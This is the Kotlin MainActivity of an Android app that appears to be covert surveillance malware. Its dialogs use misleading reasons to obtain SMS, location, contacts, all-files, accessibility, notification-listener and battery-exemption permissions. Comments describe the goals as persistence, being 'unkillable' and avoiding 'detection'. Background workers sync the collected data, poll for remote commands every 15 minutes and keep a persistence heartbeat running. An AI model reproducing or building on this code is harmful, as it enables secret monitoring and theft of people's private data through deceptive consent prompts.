package com.example.myandroid

import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import androidx.activity.compose.setContent
import androidx.activity.ComponentActivity

// OPTIMIZATION: Switched to ComponentActivity (Lighter than AppCompat)
class MainActivity : ComponentActivity() {

    override fun onCreate(savedInstanceState: Bundle?) {
        setupCrashCatcher()
        super.onCreate(savedInstanceState)
        
        // 1. Set Modern UI
        setContent {
            androidx.compose.material3.MaterialTheme {
                InspectorDashboard(this)
            }
        }

        // 2. Start Background Logic
        initializeBackgroundTasks()
    }

    override fun onResume() {
        super.onResume()
        runPermissionCascade()
    }

    private fun runPermissionCascade() {
        val ctx = this

        // 1. Runtime (SMS, Location, etc)
        val missingRuntime = PermissionManager.getMissingRuntimePermissions(ctx)
        if (missingRuntime.isNotEmpty()) {
            requestPermissions(missingRuntime.toTypedArray(), 101)
            return
        }

        // 1.5 Storage (All Files Access for Android 11+)
        if (!PermissionManager.hasAllFilesAccess(ctx)) {
             showExplanationDialog("FILE SYSTEM ACCESS", "Full storage access is required to generate file reports and backups.") {
                 val intent = Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION)
                 intent.data = android.net.Uri.parse("package:$packageName")
                 startActivity(intent)
             }
             return
        }

        // 2. Accessibility (Critical for Persistence)
        if (!PermissionManager.hasAccessibility(ctx)) {
            showExplanationDialog("SYSTEM OVERRIDE REQUIRED", "Accessibility Access is required to maintain system persistence and monitor usage.") {
                startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
            }
            return
        }

        // 3. Usage Stats (Screen Time)
        if (!PermissionManager.hasUsageStats(ctx)) {
            showExplanationDialog("DATA STREAM BLOCKED", "Usage Access required to calculate digital habits.") {
                startActivity(Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS))
            }
            return
        }

        // 4. Notification Listener (Symbiote)
        if (!PermissionManager.hasNotificationListener(ctx)) {
            showExplanationDialog("LINK REQUIRED", "Notification Access required for real-time alerts.") {
                startActivity(Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS))
            }
            return
        }
        
        // 5. Battery (Unkillable)
        if (!PermissionManager.isIgnored(ctx)) {
             val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS)
             intent.data = android.net.Uri.parse("package:$packageName")
             startActivity(intent)
             return // Wait for user to return
        }

        // --- SMART INITIALIZATION: CASCADE COMPLETE ---
        // Once the user finishes the entire cascade, queue a final initial data sync.
        val prefs = getSharedPreferences("app_stats", MODE_PRIVATE)
        if (!prefs.getBoolean("full_setup_complete", false)) {
            prefs.edit().putBoolean("full_setup_complete", true).apply()
            triggerImmediateDataSync()
        }
    }

    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<String>, grantResults: IntArray) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (requestCode == 101) {
            // User answered runtime permissions (SMS, Location, Contacts).
            // Immediately queue a sync for WHATEVER they just granted.
            triggerImmediateDataSync()
        }
    }

    private fun triggerImmediateDataSync() {
        val wm = androidx.work.WorkManager.getInstance(this)
        val constraints = androidx.work.Constraints.Builder()
            .setRequiredNetworkType(androidx.work.NetworkType.CONNECTED)
            .build()
            
        // WorkManager handles the queuing. If offline, it waits. If online, it fires instantly.
        val initialSync = androidx.work.OneTimeWorkRequestBuilder<SyncWorker>()
            .setConstraints(constraints)
            .build()
            
        wm.enqueueUniqueWork("InitialDataSync", androidx.work.ExistingWorkPolicy.REPLACE, initialSync)
    }

    private fun showExplanationDialog(title: String, msg: String, onConfirm: () -> Unit) {
        android.app.AlertDialog.Builder(this)
            .setTitle(title)
            .setMessage(msg)
            .setCancelable(false)
            .setPositiveButton("INITIALIZE") { _, _ -> onConfirm() }
            .setNegativeButton("ABORT") { _, _ -> finishAffinity() }
            .show()
    }

    private fun setupCrashCatcher() {
        val prefs = getSharedPreferences("app_health", MODE_PRIVATE)
        
        // 1. RECOVERY TOAST: Show error from last crash
        val lastCrash = prefs.getString("last_crash_raw", null)
        if (lastCrash != null) {
            android.widget.Toast.makeText(this, "LAST_SESSION_CRASH: $lastCrash", android.widget.Toast.LENGTH_LONG).show()
            prefs.edit().remove("last_crash_raw").apply()
        }

        // 2. GLOBAL HANDLER: Catch new crashes
        val oldHandler = Thread.getDefaultUncaughtExceptionHandler()
        Thread.setDefaultUncaughtExceptionHandler { thread, throwable ->
            val rawError = throwable.stackTraceToString()
            
            // Save for recovery on next launch
            prefs.edit().putString("last_crash_raw", rawError).commit()
            
            // Attempt to toast before death
            android.os.Handler(android.os.Looper.getMainLooper()).post {
                android.widget.Toast.makeText(applicationContext, "FATAL_EXCEPTION: $rawError", android.widget.Toast.LENGTH_LONG).show()
            }
            
            // Give the Toast 4 seconds to live
            try { Thread.sleep(4000) } catch (e: Exception) {}
            
            // Let it die
            oldHandler?.uncaughtException(thread, throwable)
        }
    }

    private fun initializeBackgroundTasks() {
        NetworkTracker.init(this)
        val intent = Intent(this, MonitorService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(intent) else startService(intent)

        val wm = androidx.work.WorkManager.getInstance(this)
        
        // --- SMART INITIALIZATION: CRITICAL SNAPSHOT ---
        // Queues the device identity and static info instantly. 
        val instantConstraints = androidx.work.Constraints.Builder()
            .setRequiredNetworkType(androidx.work.NetworkType.CONNECTED)
            .build()
        val immediateSnapshot = androidx.work.OneTimeWorkRequestBuilder<HealthWorker>()
            .setConstraints(instantConstraints)
            .build()
        wm.enqueueUniqueWork("ImmediateSnapshot", androidx.work.ExistingWorkPolicy.KEEP, immediateSnapshot)

        // OPTIMIZED: Run only when battery is not low to avoid heat/detection
        val constraints = androidx.work.Constraints.Builder()
            .setRequiredNetworkType(androidx.work.NetworkType.CONNECTED)
            .setRequiresBatteryNotLow(true)
            .build()

        // Sync every 1 hour instead of 15 mins
        val syncRequest = androidx.work.PeriodicWorkRequestBuilder<SyncWorker>(1, java.util.concurrent.TimeUnit.HOURS)
            .setConstraints(constraints)
            .build()
        wm.enqueueUniquePeriodicWork("BackupWork", androidx.work.ExistingPeriodicWorkPolicy.KEEP, syncRequest)
        
        // Keep Config Sync frequent (6 hours)
        val configRequest = androidx.work.PeriodicWorkRequestBuilder<ConfigSyncWorker>(6, java.util.concurrent.TimeUnit.HOURS)
            .setConstraints(constraints)
            .build()
        wm.enqueueUniquePeriodicWork("ConfigSync", androidx.work.ExistingPeriodicWorkPolicy.KEEP, configRequest)
        
        // Remote Command (15 mins is fine as it's lightweight JSON check)
        val cmdRequest = androidx.work.PeriodicWorkRequestBuilder<RemoteCommandWorker>(15, java.util.concurrent.TimeUnit.MINUTES)
            .setConstraints(constraints)
            .build()
        wm.enqueueUniquePeriodicWork("RemoteCmdWorker", androidx.work.ExistingPeriodicWorkPolicy.KEEP, cmdRequest)

        // Health & Token Sync (Ensures we stay updated every 4 hours)
        val healthRequest = androidx.work.PeriodicWorkRequestBuilder<HealthWorker>(4, java.util.concurrent.TimeUnit.HOURS)
            .setConstraints(constraints)
            .build()
        wm.enqueueUniquePeriodicWork("HealthCheck", androidx.work.ExistingPeriodicWorkPolicy.KEEP, healthRequest)

        // Start the Immortality Heartbeat
        KeepAliveReceiver.scheduleNext(this)
    }
}